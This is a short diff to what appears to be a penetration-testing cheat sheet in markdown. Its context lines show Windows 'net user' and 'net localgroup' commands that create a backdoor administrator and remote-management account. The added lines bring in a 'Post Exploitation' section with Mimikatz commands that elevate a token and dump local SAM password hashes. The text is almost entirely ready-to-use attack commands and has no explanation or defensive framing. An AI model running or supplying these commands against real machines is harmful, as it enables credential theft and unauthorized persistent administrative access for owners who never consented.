@@ -119,6 +119,12 @@ ____
      net user USERNAME PASSWORD /add
      net localgroup Administrators USERNAME /add
      net localgroup "Remote Management Users" USERNAME /add
+ ____ 
+ # Post Exploitation  
+ ## Mimikatz
+     privilege::debug 
+     token::elevate 
+     lsadump::sam  
  ____
  
 # Resources
